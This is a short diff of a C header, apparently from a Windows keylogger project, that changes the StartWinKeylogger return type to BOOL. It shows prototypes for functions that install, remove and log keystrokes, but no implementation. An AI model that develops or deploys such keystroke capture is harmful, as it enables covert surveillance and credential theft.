@@ -18,7 +18,7 @@
 
 #define INPUT_BUFFER_SIZE 30
 
-void StartWinKeylogger(void);
+BOOL StartWinKeylogger(void);
 void RemoveWinKeylogger(void);
 BOOL LogNextKeystroke(size_t *buff_len);
 BOOL StrCmpInputBuffer(WCHAR *szBuff);
